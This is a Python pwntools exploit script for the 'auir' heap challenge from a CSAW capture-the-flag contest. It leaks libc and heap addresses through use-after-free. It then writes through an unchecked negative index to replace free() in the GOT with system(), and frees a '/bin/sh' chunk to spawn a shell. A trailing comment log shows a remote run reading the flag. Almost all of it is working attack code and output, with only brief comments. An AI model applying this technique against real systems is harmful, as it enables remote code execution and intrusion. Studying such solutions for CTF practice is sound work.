#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', terminal=['tmux', 'neww'])

if args['GDB']:
    elf, libc = ELF('./auir-2.23-0ubuntu9'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
    io = gdb.debug(
        './auir-2.23-0ubuntu9', gdbscript='''\
        c
    ''')
elif args['REMOTE']:
    elf, libc = ELF('./auir'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
    io = remote('pwn.chal.csaw.io', 7713)
else:
    elf, libc = ELF('./auir-2.23-0ubuntu9'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
    io = process(elf.path)


def make_zealots(size, skills):
    io.recvuntil('>>')
    io.sendline('1')
    io.recvuntil('>>')
    io.sendline(str(size))
    io.recvuntil('>>')
    io.sendline(str(skills))

    index = make_zealots.index
    make_zealots.index += 1
    return index


make_zealots.index = 0


def destroy_zealots(index):
    io.recvuntil('>>')
    io.sendline('2')
    io.recvuntil('>>')
    io.sendline(str(index))


def fix_zealots(index, size, skills):
    io.recvuntil('>>')
    io.sendline('3')
    io.recvuntil('>>')
    io.sendline(str(index))
    io.recvuntil('>>')
    io.sendline(str(size))
    io.recvuntil('>>')
    io.sendline(skills)


def display_skills(index):
    io.recvuntil('>>')
    io.sendline('4')
    io.recvuntil('>>')
    io.sendline(str(index))
    io.recvuntil('[*]SHOWING....\n')
    return io.recvn(8)


# [1]MAKE ZEALOTS:      malloc()s a zealot of a given size and then reads "skills" into it
# [2]DESTROY ZEALOTS:   free()s a zealot given its index (no checks)
# [3]FIX ZEALOTS:       given an index (no checks), reads new skills
# [4]DISPLAY SKILLS:    given an index (no checks), prints the skills

# malloc() two small chunks
A = make_zealots(254, 'AAAAAAAA')
B = make_zealots(254, 'BBBBBBBB')
# free() the first
destroy_zealots(A)
# leak an address in main_arena
somewhere_main_arena_address = u64(display_skills(A))
libc.address = somewhere_main_arena_address - 0x3c4b78
success('libc address: %s' % hex(libc.address))

# malloc() two fast chunks
C = make_zealots(16, 'AAAAAAAA')
D = make_zealots(16, 'BBBBBBBB')
# free() both chunks
destroy_zealots(C)
destroy_zealots(D)
# leak the address of chunk D
D_chunk_address = u64(display_skills(D))
success('D chunk address: %s' % hex(D_chunk_address))

# malloc() chunk E containing as data the address of got.free
E = make_zealots(8, p64(elf.symbols['got.free']))
# compute the address of the data of chunk E
E_chunk_data_address = D_chunk_address + 0x30
success('E chunk data address: %s' % hex(E_chunk_data_address))
# fix zealots with a negative index to reach this address of got.free and use it to overwrite free() in GOT with system()
zealots_buf_address = 0x605310
index = (E_chunk_data_address - zealots_buf_address) / 8
fix_zealots(index, 8, p64(libc.symbols['system']))

# malloc() a chunk containing '/bin/sh'
F = make_zealots(8, '/bin/sh\x00')
# call free() which in GOT is system()
destroy_zealots(F)

io.interactive()

# $ ./auir.py REMOTE
# [+] Opening connection to pwn.chal.csaw.io on port 7713: Done
# [*] '/home/ubuntu/vbox/auir'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
# [*] '/home/ubuntu/vbox/libc-amd64-2.23-0ubuntu9.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] libc address: 0x7f4ee2115000
# [+] D chunk address: 0x1c1fc10
# [+] E chunk data address: 0x1c1fc40
# [*] Switching to interactive mode
# [*]BREAKING....
# $ ls
# auir
# flag
# $ cat flag
# flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
